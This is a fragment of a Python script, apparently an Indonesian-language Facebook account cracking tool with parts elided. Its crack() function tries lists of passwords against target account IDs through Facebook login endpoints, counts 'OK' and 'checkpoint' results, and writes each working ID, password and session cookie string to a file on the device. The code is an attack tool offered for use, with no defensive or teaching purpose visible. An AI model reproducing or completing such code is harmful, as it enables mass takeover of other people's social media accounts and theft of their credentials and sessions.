...
def login_lagi334():
	try:
		...
		print('\n LOGIN BERHASIL  ---> JALANKANERINTAHNYA ');time.sleep(1)
		exit()
	except Exception as e:
...
def setting():
	...
	ioz = '[01] METHOD M-FACEBOOK [02] METHOD FREE- FACEBOOK '
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	print('\r [%s◕‿◕\33[m] %s/%s 😎 \x1b[1;92mOK:[%s] 😎 \x1b[1;93mCP:[%s] %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	for pw in pwv:
		try:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
